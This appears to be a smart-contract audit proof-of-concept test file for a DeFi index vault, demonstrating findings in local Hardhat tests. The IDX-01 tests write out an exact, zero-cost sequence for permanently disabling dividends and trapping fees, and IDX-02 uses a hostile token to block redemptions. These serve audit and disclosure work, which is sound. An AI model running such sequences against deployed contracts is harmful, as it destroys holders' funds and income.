import { expect } from "chai";
import { ethers } from "hardhat";
import { takeSnapshot, time, type SnapshotRestorer } from "@nomicfoundation/hardhat-network-helpers";
import {
  TIMELOCK,
  WAD,
  deployOpenIndex,
  indexVaultFactory,
  defaultParams,
  paramsTuple,
  maxIn,
  warmCheckpoints,
} from "./helpers/index-vault";

/**
 * ============================================================================
 *  EXTERNAL AUDIT — PROOF-OF-CONCEPT FILE (new file; touches nothing existing)
 *
 *  Three claims from the audit report, each reduced to an executable
 *  demonstration rather than an argument:
 *
 *   A. IDX-01 (High) — the dividend accumulator is MONOTONE and globally
 *      ceilinged, so a single unprivileged actor can drive it to its ceiling
 *      while they are the only eligible holder, recover 100% of the capital
 *      they used, and leave `receiveDividendsWrapped` /
 *      `harvestEcosystemFees` reverting FOREVER for every future holder.
 *      The header comment claims reverting at the push "is harmless"; it is
 *      not, because the state the push writes is permanent and shared.
 *
 *   B. IDX-02 (High) — `redeemProRata`, the documented never-blockable exit,
 *      is bricked for EVERY holder by one constituent whose `transfer`
 *      reverts, and the system has no recovery path (`delistEmpty` requires a
 *      zero reserve, which only redemption can produce).
 *
 *   C. IDX-08 (Informational) — measured worst-case gas at the real
 *      MAX_CONSTITUENTS = 32 cap, so the "comfortably within a block" claim is
 *      a number rather than an assertion.
 * ============================================================================
 */
describe("AUDIT PoC — GlobalIndexVault", () => {
  let snap: SnapshotRestorer;
  before(async () => {
    snap = await takeSnapshot();
  });
  after(async () => {
    await snap.restore();
  });

  const MAGNITUDE = 2n ** 64n;
  const MAX_MAGNIFIED_PER_SHARE = 2n ** 126n;

  // ══════════════════════════════════════════════════════════════════════════
  // A. IDX-01 — permanent, irreversible poisoning of the dividend accumulator
  // ══════════════════════════════════════════════════════════════════════════

  it("IDX-01: one unprivileged actor permanently bricks ALL future dividends, at zero net cost", async () => {
    const fx = await deployOpenIndex();
    const attacker = fx.alice;
    const divAsset = fx.tokens[0]; // the vault's immutable dividendAsset
    await divAsset.connect(attacker).approve(fx.vaultAddr, ethers.MaxUint256);

    // ── Step 1. Become the ONLY eligible holder, holding exactly 1 base unit.
    // The seed at SEED_LOCK is excluded from `eligible` by design, so a single
    // base-unit mint makes the accumulator's divisor exactly 1.
    await fx.vault.connect(attacker).mintProRata(1n, maxIn(3));
    const seedBal: bigint = await fx.vault.balanceOf(
      "0x000000000000000000000000000000000000dEaD"
    );
    const eligible: bigint = (await fx.vault.totalSupply()) - seedBal;
    expect(eligible).to.equal(1n); // divisor == 1

    // ── Step 2. Push exactly the amount that lands the accumulator ON its
    // compile-time ceiling. delta = pot * MAGNITUDE / eligible = pot * 2**64,
    // so pot = 2**62 gives delta = 2**126 = MAX_MAGNIFIED_PER_SHARE exactly.
    // That is ~4.61 whole tokens. Not a whale. Not a flash loan.
    const pot = 2n ** 62n;
    const attackerBefore: bigint = await divAsset.balanceOf(attacker.address);
    await fx.vault.connect(attacker).receiveDividendsWrapped(pot);

    expect(await fx.vault.magnifiedDividendPerShare()).to.equal(
      MAX_MAGNIFIED_PER_SHARE
    );

    // ── Step 3. The attacker takes every wei of it straight back out. Their
    // net cost for permanently disabling the mechanism is gas.
    await fx.vault.connect(attacker).claimDividend();
    const attackerAfter: bigint = await divAsset.balanceOf(attacker.address);
    expect(attackerBefore - attackerAfter).to.equal(0n); // full recovery

    // ── Step 4. The damage. `magnifiedDividendPerShare` only ever increases,
    // and the guard is `acc > MAX`, so every future push of any size reverts.
    // Honest holders arrive, hold real size, and can never be paid.
    await fx.vault.connect(fx.bob).mintProRata(100n * WAD, maxIn(3));
    await fx.tokens[0].connect(fx.carol).approve(fx.vaultAddr, ethers.MaxUint256);

    await expect(
      fx.vault.connect(fx.carol).receiveDividendsWrapped(1n * WAD)
    ).to.be.revertedWithCustomError(fx.vault, "DividendAccumulatorFull");

    // The ONLY pushes that still "succeed" are ones so small that
    // `delta = floor(pot * MAGNITUDE / eligible)` rounds to zero — i.e. the
    // funds are transferred in, counted in `totalDividendsReceived`, and
    // credited to NOBODY. Silent absorption, not a working mechanism.
    const recvBefore: bigint = await fx.vault.totalDividendsReceived();
    await fx.vault.connect(fx.carol).receiveDividendsWrapped(1n);
    expect((await fx.vault.totalDividendsReceived()) - recvBefore).to.equal(1n);
    expect(await fx.vault.magnifiedDividendPerShare()).to.equal(
      MAX_MAGNIFIED_PER_SHARE
    ); // unchanged: the wei was absorbed, never distributed

    // The mechanism is permanently dead while every other path still works —
    // which is exactly why this survives an "is the exit door open?" test.
    expect(await fx.vault.withdrawableDividendOf(fx.bob.address)).to.equal(0n);
  });

  it("IDX-01b: the same poisoning permanently TRAPS the segregated ecosystem-fee ledger", async () => {
    // With the vault appointed as its own sink (the production shape the
    // header names), `harvestEcosystemFees` routes through `_creditDividends`.
    // A poisoned accumulator therefore makes the ONLY exit from
    // `ecosystemFeesWei` revert forever — fees keep being diverted out of NAV
    // into a ledger with no door.
    const fx = await deployOpenIndex();
    const divAsset = fx.tokens[0];
    await divAsset.connect(fx.alice).approve(fx.vaultAddr, ethers.MaxUint256);

    // Appoint the vault as its own ecosystem sink, through the real timelock.
    await fx.vault
      .connect(fx.allocation)
      .queueParam(
        ethers.encodeBytes32String("ecosystemSink"),
        BigInt(fx.vaultAddr)
      );
    await time.increase(TIMELOCK + 1);
    await fx.vault.executeParam(ethers.encodeBytes32String("ecosystemSink"));
    expect(await fx.vault.ecosystemSink()).to.equal(fx.vaultAddr);
    expect(await fx.vault.ecosystemAsset()).to.equal(fx.addrs[0]);

    // Poison, exactly as in IDX-01.
    await fx.vault.connect(fx.alice).mintProRata(1n, maxIn(3));
    await fx.vault.connect(fx.alice).receiveDividendsWrapped(2n ** 62n);
    await fx.vault.connect(fx.alice).claimDividend();

    // Now generate a real ecosystem fee on the priced deposit path. (The
    // timelock advance above outran `staleAfter`, so re-warm the oracle first
    // — that is fixture hygiene, not part of the finding.)
    await warmCheckpoints(fx, 4);
    await fx.vault
      .connect(fx.bob)
      .mintSingleAsset(fx.addrs[0], 5n * WAD, 0n);
    const trapped: bigint = await fx.vault.ecosystemFeesWei(fx.addrs[0]);
    expect(trapped).to.be.greaterThan(0n);

    // ...and the one and only harvest path is permanently shut.
    await expect(
      fx.vault.connect(fx.carol).harvestEcosystemFees()
    ).to.be.revertedWithCustomError(fx.vault, "DividendAccumulatorFull");

    // The ledger keeps growing with every priced operation, with no exit.
    await fx.vault.connect(fx.bob).mintSingleAsset(fx.addrs[0], 5n * WAD, 0n);
    expect(await fx.vault.ecosystemFeesWei(fx.addrs[0])).to.be.greaterThan(
      trapped
    );
  });

  // ══════════════════════════════════════════════════════════════════════════
  // B. IDX-02 — the "never blockable" exit door, blocked, with no recovery
  // ══════════════════════════════════════════════════════════════════════════

  it("IDX-02: one constituent with a reverting transfer bricks redeemProRata for EVERY holder, permanently", async () => {
    const fx = await deployOpenIndex();

    // A token that behaves perfectly at listing time and turns hostile later —
    // i.e. any pausable, upgradeable, or blacklisting ERC-20 in existence.
    const Hostile = await ethers.getContractFactory("MockHostileStream");
    const hostile: any = await Hostile.deploy("HOSTILE", "HST");
    const hostileAddr = await hostile.getAddress();
    const Source = await ethers.getContractFactory("MockIndexPriceSource");
    const src: any = await Source.deploy(100n * WAD, 100n * WAD);

    // Admitted through the FULL timelocked, role-gated path. Nothing is
    // bypassed here; this is the intended admission procedure.
    await fx.vault
      .connect(fx.admission)
      .queueListing(hostileAddr, await src.getAddress(), 2_000n, false);
    await time.increase(TIMELOCK + 1);
    await fx.vault.executeListing(hostileAddr);
    expect(await fx.vault.constituentCount()).to.equal(4n);
    await warmCheckpoints(fx, 4);

    // Ordinary users enter. `mintProRata` FORCES them to supply the new leg —
    // there is no opt-out on the proportional path.
    for (const who of [fx.alice, fx.bob]) {
      await hostile.mint(who.address, 100_000n * WAD);
      await hostile.connect(who).approve(fx.vaultAddr, ethers.MaxUint256);
      await fx.vault.connect(who).mintSingleAsset(hostileAddr, 5n * WAD, 0n);
      await fx.vault.connect(who).mintProRata(10n * WAD, maxIn(4));
    }
    expect(await fx.vault.reserveOf(hostileAddr)).to.be.greaterThan(0n);

    // Baseline: the exit door works.
    await fx.vault
      .connect(fx.alice)
      .redeemProRata(1n * WAD, new Array(4).fill(0n));

    // ── The flip. `transfer` reverts; `transferFrom` still works, so the leg
    // still ACCEPTS deposits while refusing to pay anything out.
    await hostile.setModes(true, false, false, false);

    // ── ROUND 10: CLOSED. Every holder's free, pro-rata, in-kind exit still
    // works. The hostile leg is DEFERRED into a named credit instead of
    // reverting the whole basket. (The setup above is preserved verbatim; only
    // this assertion block moved from pinning the brick to pinning the fix.)
    const reserveAtBreak: bigint = await fx.vault.reserveOf(hostileAddr);
    for (const who of [fx.alice, fx.bob]) {
      const healthy0: bigint = await fx.tokens[0].balanceOf(who.address);
      await expect(
        fx.vault.connect(who).redeemProRata(1n * WAD, new Array(4).fill(0n))
      ).to.emit(fx.vault, "RedeemedProRata");
      expect(await fx.tokens[0].balanceOf(who.address)).to.be.greaterThan(healthy0);
      expect(await fx.vault.pendingClaim(who.address, hostileAddr)).to.be.greaterThan(0n);
    }

    // ── And there IS a recovery now. Governance deactivates the leg through
    // the full timelock, and the reserve — which previously could not be moved
    // at all, making `delistEmpty`'s `reserve == 0` precondition unreachable by
    // construction — is drawn down by exactly what the holders were owed.
    await fx.vault
      .connect(fx.admission)
      .queueListing(hostileAddr, await src.getAddress(), 0n, true);
    await time.increase(TIMELOCK + 1);
    await fx.vault.executeListing(hostileAddr);

    const owedTotal: bigint =
      (await fx.vault.pendingClaim(fx.alice.address, hostileAddr)) +
      (await fx.vault.pendingClaim(fx.bob.address, hostileAddr));
    expect(await fx.vault.reservedClaims(hostileAddr)).to.equal(owedTotal);
    expect(await fx.vault.reserveOf(hostileAddr)).to.equal(reserveAtBreak - owedTotal);

    // Redemption keeps working after deactivation, too — the exit door is not
    // a function of the constituent's governance state.
    await expect(
      fx.vault.connect(fx.alice).redeemProRata(1n * WAD, new Array(4).fill(0n))
    ).to.emit(fx.vault, "RedeemedProRata");

    // And the single-asset exit is NOT a reliable fallback. It never touches
    // the hostile leg's `transfer`, but it is the PRICED path: fee-charging,
    // persistence-gated, `ReserveWouldEmpty`-bounded, and — as here —
    // `_requireCapNotWorsened`-gated, because shrinking one leg mechanically
    // raises every other leg's share of NAV. In this very state Alice cannot
    // use it either.
    await warmCheckpoints(fx, 3);
    await expect(
      fx.vault.connect(fx.alice).redeemSingleAsset(1n * WAD, fx.addrs[1], 0n)
    ).to.be.revertedWithCustomError(fx.vault, "ConcentrationCapExceeded");
  });

  // ══════════════════════════════════════════════════════════════════════════
  // C. IDX-08 — measured worst-case gas at the real 32-constituent cap
  // ══════════════════════════════════════════════════════════════════════════

  it("IDX-08: measures worst-case gas at MAX_CONSTITUENTS = 32", async () => {
    const [, roleAdmin, seeder, alice, , , admission, risk, allocation] =
      await ethers.getSigners();

    const N = 32;
    const Token = await ethers.getContractFactory("MockIndexToken");
    const Source = await ethers.getContractFactory("MockIndexPriceSource");
    const tokens: any[] = [];
    const addrs: string[] = [];
    const sources: any[] = [];
    for (let i = 0; i < N; i++) {
      const t: any = await Token.deploy(`c${i}`, `c${i}`);
      const s: any = await Source.deploy(100n * WAD, 100n * WAD);
      tokens.push(t);
      sources.push(s);
      addrs.push(await t.getAddress());
    }

    const Vault = await indexVaultFactory();
    const vault: any = await Vault.deploy(
      "Max Basket",
      "MAX",
      [roleAdmin.address, admission.address, risk.address, allocation.address],
      seeder.address,
      TIMELOCK,
      paramsTuple(defaultParams),
      addrs[0]
    );
    const vaultAddr = await vault.getAddress();

    for (let i = 0; i < N; i++) {
      await vault
        .connect(seeder)
        .seedConstituent(addrs[i], await sources[i].getAddress(), 300);
      await tokens[i].mint(seeder.address, 1000n * WAD);
      await tokens[i].connect(seeder).approve(vaultAddr, 1000n * WAD);
      await vault.connect(seeder).seedDeposit(addrs[i], 1000n * WAD);
      await tokens[i].mint(alice.address, 500_000n * WAD);
      await tokens[i].connect(alice).approve(vaultAddr, ethers.MaxUint256);
    }
    await vault.connect(seeder).openIndex(1000n * WAD);

    // Fill every ring-buffer slot on every leg: the worst case for the
    // O(n * OBS_SLOTS) valuation passes.
    for (let k = 0; k < 8; k++) {
      await time.increase(Number(defaultParams.minCheckpointInterval) + 1);
      await vault.checkpointAll();
    }

    const report: Record<string, bigint> = {};
    const measure = async (label: string, tx: Promise<any>) => {
      const r = await (await tx).wait();
      report[label] = r!.gasUsed;
    };

    await measure(
      "checkpointAll (32 legs)",
      vault.checkpointAll.apply(null, [])
    );
    await measure(
      "mintProRata (32 legs)",
      vault.connect(alice).mintProRata(100n * WAD, maxIn(N))
    );
    await measure(
      "mintSingleAsset (32 legs)",
      vault.connect(alice).mintSingleAsset(addrs[5], 1n * WAD, 0n)
    );
    await measure(
      "redeemSingleAsset (32 legs)",
      vault.connect(alice).redeemSingleAsset(1n * WAD, addrs[5], 0n)
    );
    await measure(
      "redeemProRata (32 legs)",
      vault.connect(alice).redeemProRata(50n * WAD, new Array(N).fill(0n))
    );
    await measure("refreshEligibleCount (32 legs)", vault.refreshEligibleCount());

    // eslint-disable-next-line no-console
    console.log("\n    ── worst-case gas at MAX_CONSTITUENTS = 32 ──");
    for (const [k, v] of Object.entries(report)) {
      // eslint-disable-next-line no-console
      console.log(`    ${k.padEnd(34)} ${v.toString().padStart(10)}`);
    }

    // The claim under test: every path is comfortably payable inside a 30M
    // block. Assert it rather than assume it.
    for (const [k, v] of Object.entries(report)) {
      expect(v, `${k} exceeded 30M`).to.be.lessThan(30_000_000n);
    }
  });
});
